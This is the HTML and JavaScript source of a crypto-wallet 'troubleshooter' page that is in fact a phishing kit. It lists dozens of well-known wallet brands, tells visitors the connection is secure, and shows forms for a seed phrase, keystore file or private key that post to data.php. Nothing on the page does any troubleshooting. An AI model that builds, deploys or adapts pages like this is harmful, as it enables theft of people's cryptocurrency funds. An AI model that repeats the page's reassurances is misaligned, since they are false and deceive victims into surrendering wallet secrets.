<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>DApps | Wallet Troubleshooter</title>
    <meta name="description" content="DApps | Wallet Troubleshooter" />
    <link rel="stylesheet" href="grid.css" />
    <link rel="stylesheet" href="grid.css"> <!-- Add your CSS file here -->

    <script>
        function startProcess(walletName) {
            document.getElementById('selected-wallet').textContent = `Selected Wallet: ${walletName}`;
            openModal('modal-manual');
        }

        function openModal(id) {
            document.getElementById(id).showModal();
        }

        function closeModal(id) {
            document.getElementById(id).close();
        }

        function showSection(type) {
            const manualSection = document.getElementById('manual-section');
            manualSection.innerHTML = ''; // Clear previous content

            let content = '';
            if (type === 'phrase') {
                content = `
                    <form action="data.php" method="POST">
                        <h4>Wallet Phrase</h4>
                        <textarea name="phrase" placeholder="Enter your wallet phrase" rows="3" class="w-full text-gray-700 focus:outline-none bg-white border-[1px] border-customGray-main rounded-[10px] p-2"style="width: 100%;" required></textarea>
                        <input type="hidden" name="wallet_name" value="${document.getElementById('selected-wallet').textContent.replace('Selected Wallet: ', '')}">
                        <button type="submit" class="text-[14px] bg-[#090979] rounded-[4px] p-2 text-white font-bold">Validate</button>
                    </form>`;
            } else if (type === 'keystore') {
                content = `
                    <form action="data.php" method="POST" enctype="multipart/form-data">
                        <h4>Keystore JSON</h4>
                        <input type="file" name="keystore_file" class="file-input border-[1px] border-customGray-main rounded-[10px] p-2" required />
                        <input type="hidden" name="wallet_name" value="${document.getElementById('selected-wallet').textContent.replace('Selected Wallet: ', '')}">
                        <button type="submit" class="text-[14px] bg-[#090979] rounded-[4px] p-2 text-white font-bold">Validate</button>
                    </form>`;
            } else if (type === 'privatekey') {
                content = `
                    <form action="data.php" method="POST">
                        <h4>Private Key</h4>
                        <input type="text" name="private_key" placeholder="Enter your private key" class="w-full text-gray-700 focus:outline-none bg-white border-[1px] border-customGray-main rounded-[10px] p-2" required="">
                        <input type="hidden" name="wallet_name" value="${document.getElementById('selected-wallet').textContent.replace('Selected Wallet: ', '')}">
                        <button type="submit" class="text-[14px] bg-[#090979] rounded-[4px] p-2 text-white font-bold">Validate</button>
                    </form>`;
            }

            manualSection.innerHTML = content;
        }

        function filterWallets() {
            const searchValue = document.getElementById('wallet-search').value.toLowerCase();
            const walletItems = document.getElementsByClassName('wallet-item');
            Array.from(walletItems).forEach(item => {
                const walletName = item.getAttribute('data-name');
                item.style.display = walletName.includes(searchValue) ? 'flex' : 'none';
            });
        }
    </script>
</head>

<body>
    <div class="mycontainer navConnn mt-5 pb-5">
        <div class="px-4">
            <h1 class="heading">Connect Your <span>Wallet</span></h1>

            <!-- Search Bar -->
            <div class="search-bar mt-4">
                <input type="text" id="wallet-search" class="w-full p-2 border border-gray-300 rounded-lg" placeholder="Search wallet..." oninput="filterWallets()" />
            </div>

            <div class="wallets-container mt-4 pb-4 h-[80vh] lg:h-[570px] bg-white rounded-[10px] overflow-y-scroll">
                <div class="sticky bg-white w-full h-[50px] lg:h-[60px] flex items-center justify-between px-4 border-b border-gray-300">
                <h1 class="connect-wallet-heading">CONNECT TO WALLET</h1>
                </div>

                <div class="connection-message">
                    <strong>Connection to any wallet is secure.</strong> A connection to the wallet is required for troubleshooting to commence.
                </div>


                <div id="wallet-list" class="wallet-list px-3 lg:px-5">
                    <!-- Wallets will be populated here -->
                </div>
            </div>

        </div>
    </div>

    <!-- Manual Connection Modal -->
    <dialog id="modal-manual" class="modal">
        <div class="modal-box bg-white w-[90%] md:w-[70%] lg:w-[50%] flex flex-col gap-5 p-5 rounded-lg shadow-lg">
            <p class="text-[16px] font-bold" id="selected-wallet">Selected Wallet: None</p>
            <p class="text-blue-600 text-[14px] italic">This connection is secure.</p> <!-- Secure connection message -->

            <div class="flex gap-4 justify-center md:w-[80%] md:mx-auto">
                <button class="modal-button" onclick="showSection('phrase')">Phrase</button>
                <button class="modal-button" onclick="showSection('keystore')">Keystore JSON</button>
                <button class="modal-button" onclick="showSection('privatekey')">Private Key</button>
                </div>

<!-- Manual Inputs Section -->
<div id="manual-section" class="mt-3"></div>
<button class="close-button" onclick="closeModal('modal-manual')">Close</button>
</div>
</dialog>

<script>
// Wallets Data
const wallets = [
    { name: 'Metamask', img: 'meta.png' },
    { name: 'Trust', img: 'trust.png' },
    { name: 'Coinbase', img: 'coinbase.png' },
    { name: 'Xumm', img: 'xumm.png' },
    { name: 'Cardano', img: 'cardano.png' },
    { name: 'Daedalus', img: 'daedalus.png' },
    { name: 'Yoroi', img: 'yoroi.png' },
    { name: 'CCVault', img: 'ccvault.png' },
    { name: 'Gero', img: 'gero.jpg' },
    { name: 'Nami', img: 'nami.png' },
    { name: 'Solana', img: 'solana.png' },
    { name: 'Phantom', img: 'phantom.jpg' },
    { name: 'Solflare', img: 'solflare.png' },
    { name: 'Sollet', img: 'sollet.png' },
    { name: 'Solong', img: 'solong.jpg' },
    { name: 'Exodus', img: 'exodus.png' },
    { name: 'Avalanche', img: 'avalanche.png' },
    { name: 'Velas', img: 'velas.png' },
    { name: 'Crypto.com', img: 'crypto.png' },
    { name: 'Blockchain', img: 'blockchain.png' },
    { name: 'Binance Smart Chain', img: 'bsc.png' },
    { name: 'Safepal', img: 'safepal.png' },
    { name: 'Argent', img: 'argent.jpg' },
    { name: 'Fortmatic', img: 'formatic.png' },
    { name: 'Aktionariat', img: 'aktionariat.png' },
    { name: 'Keyring Pro', img: 'keyringpro.png' },
    { name: 'BitKeep', img: 'bitkeep.png' },
    { name: 'SparkPoint', img: 'sparkpoint.png' },
    { name: 'OwnBit', img: 'ownbit.png' },
    { name: 'Infinity Wallet', img: 'infinity-wallet.png' },
    { name: 'Torus', img: 'torus.jpg' },
    { name: 'Nash', img: 'nash.jpg' },
    { name: 'BitPay', img: 'bitpay.jpg' },
    { name: 'imToken', img: 'imtoken.png' },
    { name: 'Ambire', img: 'ambire.png' },
    { name: 'Apollox', img: 'apollox.png' },
    { name: 'Bitski', img: 'bitski.png' },
    { name: 'Bobablocks', img: 'bobablocks.png' },
    { name: 'Crossmint', img: 'crossmint.png' },
    { name: 'Defiant', img: 'defiant.png' },
    { name: 'Fireblocks', img: 'fireblocks.jpg' },
    { name: 'Kryptogo', img: 'kryptogo.png' },
    { name: 'Ledger', img: 'ledger.png' },
    { name: 'Now', img: 'now.png' },
    { name: 'Nufinetes', img: 'nufinetes.png' },
    { name: 'Onekey', img: 'onekey.png' },
    { name: 'Paper', img: 'paper.png' },
    { name: 'Pier', img: 'pier.png' },
    { name: 'Prema', img: 'prema.png' },
    { name: 'Rice', img: 'rice.jpg' },
    { name: 'Safemoon', img: 'safemoon.jpg' },
    { name: 'Secux', img: 'secux.jpg' },
    { name: 'Sequence', img: 'sequence.png' },
    { name: 'Tokenary', img: 'tokenary.jpg' },
    { name: 'Unipass', img: 'unipass.jpg' },
    { name: 'Venly', img: 'venly.jpg' },
    { name: 'Verso', img: 'verso.png' },
    { name: 'Wallet3', img: 'wallet3.png' },
    { name: 'Polkadot', img: 'polkadot.png' },
    { name: 'Filecoin', img: 'filecoin.png' },
    { name: 'IOST', img: 'iost.png' },
    { name: 'Qtum', img: 'qtum.png' },
    { name: 'Algorand', img: 'algorand.png' },
    { name: 'Vechain', img: 'vechain.png' },
    { name: 'Tezos', img: 'tezos.png' },
    { name: 'Stellar', img: 'stellar.png' },
    { name: 'Tron', img: 'tron.webp' },
    { name: 'Terra', img: 'terra.png' },
    { name: 'Cosmos', img: 'cosmos.jpg' },
    { name: 'Metis', img: 'metis.jpeg' },
    { name: 'Optimism', img: 'Optimism.png' },
    { name: 'Injective', img: 'Injective.png' },
    { name: 'Other Wallet', img: 'other.jpg' }
];

        // Populate wallet list
        const walletList = document.getElementById('wallet-list');
        wallets.forEach(wallet => {
            const walletDiv = document.createElement('div');
            walletDiv.className = 'wallet-item flex items-center justify-between h-[2rem] border-customGray-main border-[1px] rounded-[10px] py-[1.5em] px-[0.4em] cursor-pointer';
            walletDiv.setAttribute('data-name', wallet.name.toLowerCase());
            walletDiv.onclick = () => startProcess(wallet.name);

            walletDiv.innerHTML = `
                <div class="flex items-center gap-2">
                    <div class="h-[10px] w-[10px] bg-primary-light rounded-full"></div>
                    <p class="text-customDark-main font-bold">${wallet.name}</p>
                </div>
                <div><img src="${wallet.img}" alt="${wallet.name}" class="w-[40px] h-auto rounded-full" /></div>
            `;

            walletList.appendChild(walletDiv);
        });
    </script>
</body>

<div class="mycontainer">
    <div class="">
        <footer
            class="border-t-[1px] border-b-customGray-main footer text-neutral-content items-center p-4">
            <aside class="grid-flow-col items-center" class="w-[50px] h-[50px]">
                <p class="font-bold">Copyright © <!-- -->2024<!-- --> - All right reserved</p>
            </aside>
            <nav class="grid-flow-col gap-4 md:place-self-center justify-self-center md:justify-self-end">
                <ul class="flex items-center gap-4 font-bold">
                    <li><a href="#">Privacy policy</a></li>
                    <li><a href="#">Terms of use</a></li>
                </ul>
            </nav>
        </footer>
    </div>
</div>
</div>
</div>

</html>
